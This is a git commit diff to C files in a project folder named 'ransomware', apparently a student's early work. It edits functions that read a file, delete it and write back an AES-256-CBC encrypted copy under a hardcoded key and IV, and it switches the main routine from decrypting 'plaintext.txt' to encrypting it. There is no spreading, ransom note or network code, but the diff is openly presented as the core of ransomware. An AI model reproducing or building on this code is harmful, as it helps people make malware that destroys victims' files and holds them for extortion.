66cdb2068d9792bcd6c3d93f618efd145aac12cf
CHRISTOPHERDIEHL <csd92@scarletmail.rutgers.edu>
2016-08-30 01:00:52 -0400

    Encryption finished

--- ransomware/driver.c
+++ ransomware/driver.c
@@ -6,38 +6,7 @@
 #include <ctype.h>
 #include <sys/stat.h>
 #include <stdio.h>
-
-int decrypt(char * filename, unsigned char * key, unsigned char * iv)
-{
-	size_t file_length = get_file_length(filename)+1;
-	FILE * encrypted_file = fopen(filename,"rb");
-	int out1 = 0; int out2 = 0;
-	unsigned char * encrypted_file_buffer = malloc(file_length);
-	unsigned char * decrypted_file_buffer = malloc(file_length- BUFFSIZE);
-
-
-	EVP_CIPHER_CTX * ctx = EVP_CIPHER_CTX_new();
-	if ( 1 != EVP_DecryptInit_ex(ctx,EVP_aes_256_cbc(),NULL,key,iv))
-		exit(-1);
-	EVP_DecryptUpdate(ctx,decrypted_file_buffer,&out1,encrypted_file_buffer,file_length);
-	EVP_DecryptFinal(ctx,decrypted_file_buffer+out1,&out2);
-
-	if(encrypted_file == 0)
-		exit(-1);
-
-	fread(encrypted_file_buffer,1,file_length,encrypted_file);
-	fclose(encrypted_file);
-	remove(filename);
-
-	FILE * decrypted_file = fopen(filename,"w");
-	fwrite(decrypted_file_buffer,1,out1+out2,decrypted_file);
-	fclose(decrypted_file);
-
-	free(encrypted_file_buffer);
-	free(decrypted_file_buffer);
-
-	return 1;
-}
+#include <openssl/aes.h>
 
 int main (int argc, char ** argv) 
 {
@@ -51,10 +20,11 @@ int main (int argc, char ** argv)
 	unsigned char *iv = (unsigned char *)"01234567890123456";
 
 	printf("[-] Encrypting Now\n");
-	//encrypt("file_to_encrypt.txt",key,iv);
+	encrypt("plaintext.txt",key,iv);
 	printf("[-] Encryption finished\n");
 
-	decrypt("file_to_encrypt.txt",key,iv);
-	printf("Decryption finished");
+	//decrypt("plaintext.txt",key,iv);
+	printf("Decryption finished\n");
 	return 1;
 }
+
--- ransomware/encrypt.c
+++ ransomware/encrypt.c
@@ -3,7 +3,7 @@
 int encrypt (char * filename, unsigned char * key, unsigned char * iv)
 {
 
-	size_t file_length = get_file_length(filename) +1;
+	size_t file_length = get_file_length(filename);
 	FILE * plaintext_file = fopen(filename,"r");
 	
 	unsigned char * p_buffer = malloc(file_length);
@@ -12,29 +12,30 @@ int encrypt (char * filename, unsigned char * key, unsigned char * iv)
 
 	if (plaintext_file == 0) {
 		printf("[-] File not found \n");
-		exit(-1);
+		return -1;
 	}
-
-	//printf("key: %u iv: %u",*(unsigned int *)key,*(unsigned int *)iv);
-
-	EVP_CIPHER_CTX * ctx = EVP_CIPHER_CTX_new();
-	if ( 1 != EVP_EncryptInit_ex(ctx,EVP_aes_256_cbc(),NULL,key,iv))
-		exit(-1);
-	
-	EVP_EncryptUpdate(ctx,c_buffer,&out1,p_buffer,file_length);
-	EVP_EncryptFinal(ctx,c_buffer + out1,&out2);
 
 	fread(p_buffer,1,file_length, plaintext_file);
 	fclose(plaintext_file);
 	remove(filename);
 
+	printf("%s",p_buffer);
+
+	EVP_CIPHER_CTX * ctx = EVP_CIPHER_CTX_new();
+
+	if ( !EVP_EncryptInit_ex(ctx,EVP_aes_256_cbc(),NULL,key,iv))
+		return -1;
+
+	EVP_EncryptUpdate(ctx,c_buffer,&out1,p_buffer,file_length);
+	EVP_EncryptFinal(ctx,c_buffer + out1,&out2);
+	EVP_CIPHER_CTX_cleanup(ctx);
 
 	FILE * encrypted_file = fopen(filename,"wb");
-	fwrite(c_buffer,1,out1 + out2,encrypted_file);
+	fwrite(c_buffer,1,out1+out2,encrypted_file);
+	fclose(encrypted_file);
 
 	free(c_buffer);
 	free(p_buffer);
-	fclose(encrypted_file);
 
 	return 1;
 
@@ -42,28 +43,29 @@ int encrypt (char * filename, unsigned char * key, unsigned char * iv)
 
 int decrypt(char * filename, unsigned char * key, unsigned char * iv)
 {
-	size_t file_length = get_file_length(filename)+1;
+	size_t file_length = get_file_length(filename);
 	FILE * encrypted_file = fopen(filename,"rb");
 	int out1 = 0; int out2 = 0;
-	unsigned char * encrypted_file_buffer = malloc(file_length);
-	unsigned char * decrypted_file_buffer = malloc(file_length- BUFFSIZE);
-
-
-	EVP_CIPHER_CTX * ctx = EVP_CIPHER_CTX_new();
-	if ( 1 != EVP_DecryptInit_ex(ctx,EVP_aes_256_cbc(),NULL,key,iv))
-		exit(-1);
-	EVP_DecryptUpdate(ctx,decrypted_file_buffer,&out1,encrypted_file_buffer,file_length);
-	EVP_DecryptFinal(ctx,decrypted_file_buffer+out1,&out2);
+	unsigned char * encrypted_file_buffer = calloc(1,file_length+1);
+	unsigned char * decrypted_file_buffer = calloc(1,file_length+1);
 
 	if(encrypted_file == 0)
-		exit(-1);
+		return -1;
 
 	fread(encrypted_file_buffer,1,file_length,encrypted_file);
 	fclose(encrypted_file);
 	remove(filename);
-
+	
 	FILE * decrypted_file = fopen(filename,"w");
-	fwrite(decrypted_file_buffer,1,out1+out2,decrypted_file);
+
+	EVP_CIPHER_CTX * ctx = EVP_CIPHER_CTX_new();
+	if ( !EVP_DecryptInit_ex(ctx,EVP_aes_256_cbc(),NULL,key,iv))
+		exit(-1);
+    EVP_DecryptUpdate(ctx,decrypted_file_buffer,&out1,encrypted_file_buffer,file_length);
+    EVP_DecryptFinal(ctx,decrypted_file_buffer + out1,&out2);
+
+    fwrite(decrypted_file_buffer,sizeof(char),out1 + out2,decrypted_file);
+
 	fclose(decrypted_file);
 
 	free(encrypted_file_buffer);
@@ -72,21 +74,6 @@ int decrypt(char * filename, unsigned char * key, unsigned char * iv)
 	return 1;
 }
 
-/*
-char * concat(char * filename)
-{
-	char * return_val = malloc(strlen(filename) +2);
-	strcpy(return_val,filename);
-	strcpy(return_val,"c");
-	return return_val;
-}
-
-char * deconcat(char * filename)
-{
-	filename[strlen(filename)-1] = '\0';
-	return filename;
-}
-*/
 
 size_t get_file_length(char * filename)
 {
